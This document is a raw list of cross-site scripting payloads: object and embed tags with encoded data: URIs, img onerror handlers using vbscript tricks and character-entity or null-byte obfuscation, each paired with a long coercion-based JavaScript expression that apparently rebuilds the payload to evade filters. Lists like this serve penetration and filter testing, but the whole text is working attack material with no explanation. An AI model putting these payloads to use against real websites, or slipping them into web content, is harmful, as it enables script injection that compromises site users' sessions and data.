[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="DaTa:text/html,<script>prompt(575)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="data&colon;text/html,<script>prompt(577)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="data&#x003A;text/html,<script>prompt(579)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="&#x64;&#x61;ta:text/html,<script>prompt(581)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=a onerror="vbscript:msgbox 1"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+"")[1]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[3]+(false+[0]+"")[2]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=b onerror="vbs:msgbox 2"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[3]+(false+[0]+"")[2]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=c onerror="vbs:prompt(587)"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=d onerror="vbscript:prompt(589)"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([][""]+"")[4]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vbscript&#x003A;prompt(591)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vb&#x63;cript:prompt(593)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="vb&#x00;scri&#x00;pt:prompt(595)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
